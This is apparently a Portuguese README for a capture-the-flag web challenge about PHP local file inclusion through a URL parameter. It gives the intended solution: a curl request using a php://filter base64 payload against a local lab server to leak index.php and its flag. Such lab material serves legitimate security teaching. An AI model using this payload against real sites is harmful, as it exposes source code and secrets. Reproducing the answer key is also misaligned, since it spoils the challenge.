# Tudo Nada Filtrado

Responsável: Fukuda

Tags: `web`, `php_filter`, `lfi`

## Desafio

Tem um site que gerencia seu conteúdo através de um parâmetro na URL. Modificando da para perceber que ele pega um arquivo através de um `include()`.

## Resolução proposta

Pegar o código fonte do `index.php` utilizando um *php conversion filter*. Ficaria algo assim: `curl 'http://localhost:47200/index.php?pagina=php://filter/convert.base64-encode/resource=index'`.

Depois é preciso pegar o resultado em base64 e passar em um decodificador assim: `base64 -d <<<'resultado_em_base64'`.

A flag vai estar em uma variável com o nome `$flag`.

## Como rodar

```sh
make start
```

O servidor vai estar rodando em `http://localhost:47200/`.
